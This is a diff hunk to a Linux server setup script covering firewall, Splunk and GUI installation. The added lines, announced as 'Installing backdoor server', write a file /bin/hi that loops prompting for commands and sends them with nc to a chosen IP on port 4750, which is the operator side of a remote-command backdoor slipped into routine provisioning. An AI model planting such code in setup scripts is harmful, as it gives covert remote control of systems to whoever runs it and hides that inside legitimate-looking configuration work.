@@ -160,6 +160,17 @@ python3 $repo_root/scripts/linux/nfTablesFirewall/setup.py "splunk"
 #echo "Beginning remote setup..."
 #manticore -i
 #manticore -gi
+echo "Installing backdoor server"
+cat << EOFA > /bin/hi
+echo "Enter IP to connect to: "
+read ip
+while true; do
+	echo "Enter command: "
+	read command
+	message="idk###$command"
+	echo "$message" | nc "$ip" 4750
+done
+EOFA
 echo "Beginning GUI setup..."
 yum update -y
 yum groupinstall -y "Server with GUI"
